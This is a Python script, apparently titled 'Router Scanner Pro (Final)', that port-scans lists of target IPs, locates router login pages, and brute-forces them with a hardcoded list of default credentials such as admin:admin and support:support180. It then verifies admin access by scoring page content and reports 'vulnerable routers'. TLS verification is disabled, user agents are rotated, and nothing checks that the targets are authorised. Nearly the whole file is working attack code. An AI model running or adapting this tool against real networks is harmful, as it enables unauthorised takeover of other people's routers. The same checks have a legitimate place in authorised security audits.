#!/usr/bin/env python3
import argparse
import os
import socket
import sys
import time
import base64
import random
import re
from urllib.parse import urlparse

import requests

# Reuse existing components from the primary module
from router_scanner_pro import Colors, USER_AGENTS, COMMON_PORTS, BRAND_PATTERNS  # type: ignore


TARGET_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "support180"),
    ("support", "support"),
    ("user", "user"),
]


def quick_port_scan(ip: str, ports):
    open_ports = []
    for port in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(0.7)
                if sock.connect_ex((ip, port)) == 0:
                    open_ports.append(port)
        except Exception:
            continue
    return open_ports


class RouterScannerFinal:
    def __init__(self, timeout: int = 8, enable_screenshot: bool = False):
        self.timeout = timeout
        self.enable_screenshot = enable_screenshot
        self.session = self._create_session()

    def _create_session(self):
        s = requests.Session()
        s.headers.update({"User-Agent": random.choice(USER_AGENTS)})
        return s

    # Conservative credential test: do NOT decide success here
    def test_credentials(self, url: str, username: str, password: str, auth_type: str):
        try:
            if auth_type == 'http_basic':
                resp = self.session.get(url, auth=(username, password), timeout=self.timeout, verify=False, allow_redirects=True)
                # Only pass candidate forward; real success decided later
                if 200 <= resp.status_code < 400:
                    return True, resp.url
                return False, None

            # Form/API: attempt post but do not claim success based on body
            form_data_options = [
                {"username": username, "password": password},
                {"user": username, "pass": password},
                {"login": username, "passwd": password},
                {"name": username, "pwd": password},
            ]
            for data in form_data_options:
                try:
                    r = self.session.post(url, data=data, timeout=self.timeout, verify=False, allow_redirects=True)
                    if 200 <= r.status_code < 400:
                        return True, r.url
                except Exception:
                    continue
            return False, None
        except Exception:
            return False, None

    # Robust admin verification with scoring
    def verify_admin_access(self, admin_url: str, username: str, password: str, auth_type: str):
        try:
            s = requests.Session()
            s.headers.update({
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive',
            })

            if auth_type == 'http_basic':
                resp = s.get(admin_url, auth=(username, password), timeout=self.timeout, verify=False, allow_redirects=True)
            else:
                # try multiple payloads
                resp = None
                payloads = [
                    {"username": username, "password": password},
                    {"user": username, "pass": password},
                    {"login": username, "passwd": password},
                    {"name": username, "pwd": password},
                ]
                for data in payloads:
                    try:
                        r = s.post(admin_url, data=data, timeout=self.timeout, verify=False, allow_redirects=True)
                        if r is not None and r.status_code >= 200:
                            resp = r
                            break
                    except Exception:
                        continue
                if resp is None:
                    return False, {}

            if resp is None:
                return False, {}

            content = resp.text.lower()
            final_url = resp.url.lower()
            score = 0

            # 1) moved away from login page
            login_keywords = ["login", "sign-in", "signin", "auth", "authentication"]
            if not any(k in final_url for k in login_keywords):
                score += 2

            # 2) presence of admin indicators
            admin_indicators = [
                'admin', 'administrator', 'dashboard', 'control panel', 'configuration', 'settings',
                'system', 'status', 'network', 'wan', 'lan', 'wireless', 'ssid', 'firmware', 'logout'
            ]
            score += sum(1 for k in admin_indicators if k in content)

            # 3) logout presence
            if any(k in content for k in ['logout', 'sign out', 'log out']):
                score += 2

            # 4) session cookies
            if any('session' in c.lower() or 'auth' in c.lower() or 'token' in c.lower() for c in s.cookies.keys()):
                score += 2

            # 5) negative signals
            fail_hits = sum(1 for k in [
                'invalid', 'incorrect', 'failed', 'denied', 'forbidden', 'unauthorized',
                'login failed', 'authentication failed', 'wrong password'
            ] if k in content)
            score -= fail_hits * 2

            return (score >= 5), {"score": score, "final_url": final_url}
        except Exception:
            return False, {}

    # Minimal auth detection using the existing heuristics from HTML
    def detect_authentication_type(self, url: str):
        try:
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            r = self.session.get(url, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
            content = r.text.lower()
            final_url = r.url

            # http basic
            if r.status_code == 401 and 'www-authenticate' in str(r.headers).lower():
                return 'http_basic', r, final_url

            # form based
            if '<form' in content and any(k in content for k in ['password', 'passwd']):
                return 'form_based', r, final_url

            # api-based hint
            if 'application/json' in str(r.headers).lower() or 'api' in content:
                return 'api_based', r, final_url

            return None, r, final_url
        except Exception:
            return None, None, url

    def scan_target(self, ip: str):
        print(f"{Colors.YELLOW}[1/4] Port Scanning...{Colors.END}")
        ports = quick_port_scan(ip, COMMON_PORTS)
        if not ports:
            print(f"{Colors.YELLOW}[!] No open ports found{Colors.END}")
            return {"ip": ip, "vulnerabilities": [], "login_pages": []}
        print(f"{Colors.GREEN}[+] Found {len(ports)} open ports: {ports}{Colors.END}")

        result = {"ip": ip, "vulnerabilities": [], "login_pages": []}

        print(f"{Colors.YELLOW}[2/4] Brand Detection & Login Discovery...{Colors.END}")
        brand = 'generic'

        for port in ports:
            # Compose candidate paths
            try_paths = []
            try_paths.extend(BRAND_PATTERNS['generic']['paths'])
            for b in BRAND_PATTERNS:
                if b == 'generic':
                    continue
                try_paths.extend(BRAND_PATTERNS[b]['paths'])

            for path in try_paths:
                url = f"http://{ip}:{port}{path}"
                auth_type, resp, final_url = self.detect_authentication_type(url)
                if not auth_type:
                    continue

                login_url = final_url or url
                print(f"{Colors.GREEN}[+] LOGIN PAGE FOUND: {login_url} ({auth_type}){Colors.END}")
                result['login_pages'].append({"url": login_url, "port": port, "auth_type": auth_type})

                print(f"{Colors.YELLOW}[3/4] Brute Force Attack...{Colors.END}")
                for username, password in TARGET_CREDENTIALS:
                    print(f"{Colors.CYAN}[>] Testing: {username}:{password}{Colors.END}")
                    ok, cand_admin = self.test_credentials(login_url, username, password, auth_type)
                    if not ok or not cand_admin:
                        print(f"{Colors.YELLOW}[-] {username}:{password} failed{Colors.END}")
                        continue

                    print(f"{Colors.YELLOW}[4/4] Admin Verification & Information Extraction...{Colors.END}")
                    verified, info = self.verify_admin_access(cand_admin, username, password, auth_type)
                    if verified:
                        print(f"{Colors.RED}🔒 VULNERABLE: {username}:{password} works!{Colors.END}")
                        print(f"{Colors.GREEN}[+] Admin URL: {cand_admin}{Colors.END}")
                        print(f"{Colors.GREEN}[+] Admin access verified!{Colors.END}")
                        result['vulnerabilities'].append({
                            "type": "Default Credentials",
                            "credentials": f"{username}:{password}",
                            "admin_url": cand_admin,
                            "verified": True,
                        })
                        return result
                    else:
                        print(f"{Colors.RED}[-] Admin access verification failed{Colors.END}")

        print(f"{Colors.RED}[-] No valid credentials found{Colors.END}")
        return result


def parse_targets(targets_arg: str):
    # minimal: single IP or file with IPs
    if os.path.isfile(targets_arg):
        with open(targets_arg, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
    return [targets_arg]


def print_banner():
    for _ in range(3):
        print(f"{Colors.GREEN}" + "|" * 60 + f"{Colors.END}")
        time.sleep(0.05)
    print(f"\n{Colors.CYAN}:: Router Scanner Pro (Final) ::{Colors.END}  {Colors.YELLOW}[ Conservative Verify Mode ]{Colors.END}")


def main():
    parser = argparse.ArgumentParser(description="Router Scanner Final - Conservative Admin Verification")
    parser.add_argument('-t', '--targets', required=True, help='Target IP or file')
    parser.add_argument('--timeout', type=int, default=8, help='Timeout seconds')
    args = parser.parse_args()

    print_banner()
    targets = parse_targets(args.targets)
    print(f"{Colors.GREEN}[+] Loaded {len(targets)} targets{Colors.END}")

    scanner = RouterScannerFinal(timeout=args.timeout, enable_screenshot=False)
    all_results = []
    start = time.time()
    for ip in targets:
        print("-" * 80)
        print(f"\n{Colors.YELLOW}[*] SCANNING TARGET: {ip}{Colors.END}")
        res = scanner.scan_target(ip)
        all_results.append(res)

    dur = time.time() - start
    print(f"\n{Colors.GREEN}{'='*60}{Colors.END}")
    print(f"{Colors.GREEN}[+] SCAN COMPLETE!{Colors.END}")
    print(f"{Colors.GREEN}{'='*60}{Colors.END}")
    vulns = sum(1 for r in all_results if r.get('vulnerabilities'))
    print(f"  - Total targets scanned: {len(all_results)}")
    print(f"  - Vulnerable routers: {vulns}")
    if vulns:
        print("  - Vulnerable list:")
        for r in all_results:
            if r.get('vulnerabilities'):
                v = r['vulnerabilities'][0]
                print(f"    • {r['ip']} -> {v['credentials']}")
    print(f"  - Scan duration: {dur:.1f} seconds")


if __name__ == '__main__':
    main()

